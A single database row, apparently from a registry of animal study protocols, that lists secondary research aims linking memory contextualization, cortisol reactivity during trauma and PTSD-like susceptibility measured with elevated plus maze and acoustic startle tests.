	(6392,150,'secondary_readout_parameter','\"- determine if memory contextualization (object in context task) is affected by trauma exposure or a stable trait (i.e. stable pre- and post-trauma levels)\\n- determine if pre-trauma memory contextualization (object in context task) predicts the contextualization of trauma-related information (re-exposure to trauma context)\\n- determine the relationship between HPA-axis reactivity (cortisol) during trauma and subsequent PTSD susceptibility (based on the elevated plus maze and acoustic startle)\"','2022-03-31 13:23:46','2022-03-31 13:23:46'),
